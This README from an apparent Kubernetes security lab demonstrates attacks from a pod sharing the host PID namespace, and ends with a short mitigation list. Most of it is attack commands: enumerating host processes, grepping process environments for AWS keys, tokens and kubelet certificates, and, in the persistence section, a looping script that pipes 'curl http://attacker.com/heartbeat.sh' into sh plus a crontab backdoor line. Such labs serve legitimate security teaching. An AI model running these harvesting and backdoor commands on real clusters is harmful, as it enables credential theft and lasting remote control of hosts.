# Host PID Namespace Pivoting

This example demonstrates how sharing the host's PID namespace allows a container to view and interact with all processes running on the host node, potentially leading to system compromise.

## Attack Scenario
- The container is configured with `hostPID: true`, sharing the host's process namespace.
- Attacker can view all host processes, inspect process details, and potentially kill critical system processes.
- Can be used to identify sensitive processes, extract information from process memory, or disrupt host operations.

## Deployment
```bash
# Deploy the pod
make apply
# or
kubectl apply -f pod.yaml

# Wait for the pod to be running
kubectl get pod hostpid-alpine

# Verify the pod is using host PID namespace
kubectl get pod hostpid-alpine -o jsonpath='{.spec.hostPID}'
```

## Attack Demonstration Commands

### 1. Process Enumeration and Discovery
```bash
# Exec into the pod
kubectl exec -it hostpid-alpine -- sh

# Install necessary tools
apk add --no-cache procps htop strace lsof

# View all host processes
ps aux
ps -ef

# View process tree
pstree -p

# Show process hierarchy with details
ps -eo pid,ppid,user,cmd,etime,pcpu,pmem

# Filter for specific processes
ps aux | grep -E "(kubelet|docker|containerd|crio)"
ps aux | grep -E "(sshd|systemd)"
```

### 2. Process Inspection and Information Gathering
```bash
# Inspect a specific process (e.g., kubelet)
cat /proc/1/status
cat /proc/1/cmdline
cat /proc/1/environ | tr '\0' '\n'

# Check all running processes with their PIDs
for pid in $(ls /proc | grep -E '^[0-9]+$' | head -20); do
  echo "=== PID $pid ==="
  cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' '; echo
  cat /proc/$pid/status 2>/dev/null | grep -E "(Name|State|PPid|Uid|Gid)"
done

# Find processes with specific names
pgrep -fl kubelet
pgrep -fl docker
pgrep -fl containerd

# Check process memory usage
cat /proc/meminfo
pmap -x 1 2>/dev/null || echo "pmap not available"
```

### 3. Container Runtime Process Discovery
```bash
# Find container runtime processes
ps aux | grep -E "(docker|containerd|crio|podman)"

# Inspect container runtime details
for pid in $(pgrep -f docker); do
  echo "=== Docker PID $pid ==="
  ls -la /proc/$pid/cwd/
  ls -la /proc/$pid/fd/ | head -10
done

# Find container processes
ps aux | grep -E "(pause|kube-proxy|flannel|calico)"

# Check for privileged containers
ps -eo pid,user,cmd | grep -i privileged
```

### 4. Kubernetes Component Discovery
```bash
# Find Kubernetes components
ps aux | grep -E "(kube-apiserver|kube-controller|kube-scheduler|kube-proxy|kubelet)"

# Inspect kubelet process
KUBELET_PID=$(pgrep -f kubelet | head -1)
if [ ! -z "$KUBELET_PID" ]; then
  echo "Kubelet PID: $KUBELET_PID"
  cat /proc/$KUBELET_PID/cmdline | tr '\0' ' '
  cat /proc/$KUBELET_PID/environ | tr '\0' '\n' | grep -E "(KUBE|CERT|KEY)"
fi

# Check for API server process
APISERVER_PID=$(pgrep -f kube-apiserver | head -1)
if [ ! -z "$APISERVER_PID" ]; then
  echo "API Server PID: $APISERVER_PID"
  cat /proc/$APISERVER_PID/cmdline | tr '\0' ' '
fi
```

### 5. Memory Inspection and Data Extraction
```bash
# Inspect process memory maps
cat /proc/1/maps
cat /proc/1/smaps | head -50

# Dump process memory (requires root)
# Note: This is highly invasive and may crash the process
if [ -w /proc/1/mem ]; then
  echo "Can access process memory - potential for credential extraction"
  # hexdump -C /proc/1/mem | head -20  # DANGEROUS - may crash system
fi

# Search for credentials in process memory
grep -r "password\|token\|key" /proc/*/cmdline 2>/dev/null | head -10

# Check environment variables for secrets
for pid in $(ls /proc | grep -E '^[0-9]+$' | head -10); do
  echo "=== Environment for PID $pid ==="
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i -E "(password|token|key|secret)" || true
done
```

### 6. Network Connection Discovery
```bash
# View network connections from all processes
netstat -tulpn
ss -tulpn

# Find processes listening on specific ports
netstat -tulpn | grep -E ":(22|80|443|6443|10250|2379|2380)"

# Check which processes have network connections
lsof -i -P -n | head -20

# Find processes with open files
lsof | head -20
```

### 7. Process Manipulation and Disruption
```bash
# Send signals to processes (use with caution!)
# WARNING: These commands can disrupt the host system

# Send SIGSTOP to pause a process (non-destructive)
# kill -SIGSTOP <pid>

# Send SIGCONT to resume a process
# kill -SIGCONT <pid>

# Check process capabilities
for pid in $(pgrep -f kubelet); do
  echo "=== Capabilities for PID $pid ==="
  cat /proc/$pid/status | grep Cap
done

# Change process priority (requires appropriate permissions)
# renice +10 -p <pid>

# View process limits
cat /proc/1/limits
```

### 8. File Handle and Socket Inspection
```bash
# Inspect open file handles for critical processes
ls -la /proc/1/fd/
ls -la /proc/1/fd/ | head -20

# Find processes with open sockets
find /proc -name fd -type d -exec sh -c 'echo "=== $1 ==="; ls -la "$1" 2>/dev/null | grep socket' _ {} \;

# Check for mounted filesystems
cat /proc/mounts

# Find processes with specific files open
lsof /var/log/ 2>/dev/null | head -10
```

### 9. Credential Harvesting from Processes
```bash
# Search for AWS credentials in process environments
grep -r "AWS" /proc/*/environ 2>/dev/null | head -5

# Search for database connection strings
grep -r -i "mysql\|postgres\|redis" /proc/*/cmdline 2>/dev/null | head -5

# Look for API tokens and keys
grep -r -i "token\|api_key\|secret" /proc/*/environ 2>/dev/null | head -5

# Check for SSH agent sockets
find /proc -name "agent" -type l 2>/dev/null
```

### 10. Persistence and Backdoor Injection
```bash
# Create a malicious process that persists
# Note: This requires appropriate permissions
cat > /tmp/malicious.sh << 'EOF'
#!/bin/sh
while true; do
  # Exfiltrate data or maintain access
  curl -s http://attacker.com/heartbeat.sh | sh
  sleep 300
done &
EOF
chmod +x /tmp/malicious.sh

# Try to inject into existing processes (advanced)
# This would require ptrace capabilities and is highly complex

# Create a cron job through process manipulation (if possible)
# echo "* * * * * root /tmp/malicious.sh" >> /etc/crontab
```

### 11. Container Escape via Process Manipulation
```bash
# Find processes that might be containers
ps aux | grep -E "(pause|sandbox|container)"

# Inspect container processes for escape opportunities
for pid in $(pgrep -f pause); do
  echo "=== Container PID $pid ==="
  cat /proc/$pid/status | grep -E "(Name|PPid|Uid|Gid)"
  ls -la /proc/$pid/ns/
done

# Check for processes with elevated privileges
ps -eo pid,user,cmd | grep -E "(root|0)"

# Look for processes with capabilities
for pid in $(ls /proc | grep -E '^[0-9]+$' | head -10); do
  caps=$(cat /proc/$pid/status 2>/dev/null | grep Cap | head -1)
  if [ ! -z "$caps" ] && [ "$caps" != "CapEff:\t0000000000000000" ]; then
    echo "PID $pid has capabilities: $caps"
  fi
done
```

## Verification Commands
```bash
# Verify the pod can see host processes
kubectl exec hostpid-alpine -- ps aux | head -10

# Check if we can see init process (PID 1)
kubectl exec hostpid-alpine -- ps -p 1

# Verify host PID namespace is being used
kubectl exec hostpid-alpine -- ls -la /proc/1/

# Compare with a regular pod (should not see host PIDs)
kubectl run test-pod --image=alpine --rm -it --restart=Never -- ps aux | head -5
```

## Cleanup
```bash
# Remove the pod
make clean
# or
kubectl delete -f pod.yaml

# Exit the pod shell
exit

# Verify cleanup
kubectl get pod hostpid-alpine 2>/dev/null || echo "Pod deleted successfully"
```

## Mitigation
- Avoid using `hostPID: true` unless absolutely necessary.
- Implement proper monitoring and alerting for suspicious process activities.
- Use least-privilege principles for container configurations.
- Implement Pod Security Policies or Pod Security Admission to restrict hostPID usage.
- Monitor for unusual process enumeration and manipulation activities.
- Use seccomp profiles to restrict system calls that can interact with processes.

## Files
- `pod.yaml`: Pod spec with host PID namespace sharing.
- `Makefile`: Deploy/remove the example.